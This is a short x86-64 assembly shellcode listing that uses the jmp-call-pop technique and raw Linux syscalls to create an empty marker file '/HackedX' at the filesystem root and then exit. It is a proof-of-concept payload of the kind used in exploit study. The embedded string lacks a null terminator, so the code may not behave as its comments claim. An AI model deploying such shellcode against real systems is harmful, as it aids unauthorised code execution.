BITS 64
section .text
global _start

_start:
    jmp short one

two:
    pop rdi                  ; rdi -> points to string "/HackedX"
    
    mov rax, 2               ; syscall: open
    mov rsi, 0x441           ; flags: O_WRONLY | O_CREAT | O_APPEND
    mov rdx, 0x180           ; mode: 0600
    syscall                  ; open("/HackedX", O_WRONLY|O_CREAT|O_APPEND, 0600)

    mov rdi, rax             ; move fd into rdi
    mov rax, 3               ; syscall: close(fd)
    syscall

    xor rdi, rdi             ; exit(0)
    mov rax, 0x3c            ; syscall: exit
    syscall

one:
    call two
    db "/HackedX"            ; 8 bytes (no null)
